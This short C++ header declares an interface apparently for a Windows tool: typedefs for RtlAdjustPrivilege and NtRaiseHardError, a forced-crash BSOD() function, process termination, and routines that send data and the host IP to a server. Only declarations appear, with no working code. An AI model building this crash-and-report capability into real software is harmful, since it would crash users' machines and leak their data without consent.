#pragma once
typedef LONG(NTAPI* __RtlAdjustPrivilege)(ULONG Privilege, BOOLEAN Enable, BOOLEAN CurrentThread, PBOOLEAN OldValue);
typedef LONG(NTAPI* __NtRaiseHardError)(LONG ErrorStatus, ULONG NumberOfParameters, ULONG UnicodeStringParameterMask, PULONG_PTR Parameters, ULONG ValidResponseOptions, PULONG Response);
size_t write_callback(void* contents, size_t size, size_t nmemb, void* userp);
std::string send(std::string data);
const char* GetName(HANDLE a);
void Terminate(const char*, DWORD, SIZE_T);
std::string GetIP();
const char* LoadKey();
void BSOD();
void Console();